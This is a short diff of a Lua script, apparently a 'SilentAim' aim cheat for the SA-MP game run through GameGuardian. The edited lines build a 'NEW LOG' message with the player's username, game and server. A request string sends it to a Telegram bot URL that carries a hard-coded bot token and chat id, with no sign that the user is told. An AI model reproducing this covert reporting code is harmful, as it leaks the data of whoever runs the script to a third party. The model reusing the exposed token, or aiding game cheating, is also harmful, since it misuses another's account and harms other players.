@@ -3,7 +3,8 @@ SAMPMENU = 1
 
 gg.toast("Please wait ⏳")
 gtname()
-teltxtzz = username .. ' / ' .. nmegame .. " Use SilentAim Script\nServer :" .. srvr
+
+teltxtzz = '💥 NEW LOG 💥\n🟢 username = '.. username .. '\n🟢 ' .. nmegame .. " \n🟢 Server = " .. srvr.. "\n🟢 info = Use SilentAim Script"
 
 local payloadz =
 '{"UrlBox":"https://api.telegram.org/bot6280666760:AAG5QLf_rQUZb4mqavh17hO3rCGBwrBq3RY/sendMessage?chat_id=1248088712&text=' .. teltxtzz ..'","AgentList":"Internet Explorer","VersionsList":"HTTP/1.1","MethodList":"POST"}'
